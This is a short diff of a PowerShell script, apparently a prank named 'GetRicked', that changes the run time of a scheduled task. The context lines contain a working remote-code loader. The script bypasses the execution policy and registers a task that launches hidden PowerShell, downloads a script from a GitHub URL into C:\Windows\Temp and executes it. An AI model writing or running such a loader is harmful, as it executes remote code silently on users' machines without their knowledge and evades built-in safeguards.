@@ -1,5 +1,5 @@
 Set-ExecutionPolicy -Scope CurrentUser Bypass
-$runTime = Get-Date "2025-03-31 22:30"
+$runTime = Get-Date "2025-03-31 22:40"
 $taskName = "GetRicked"
 $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden iwr -uri 'https://raw.githubusercontent.com/CyberSpooon/GetRicked/main/GetRicked.ps1' -outfile 'C:\Windows\Temp\getricked.ps1'; & 'C:\Windows\Temp\getricked.ps1'"
 $trigger = New-ScheduledTaskTrigger -Once -At $runTime
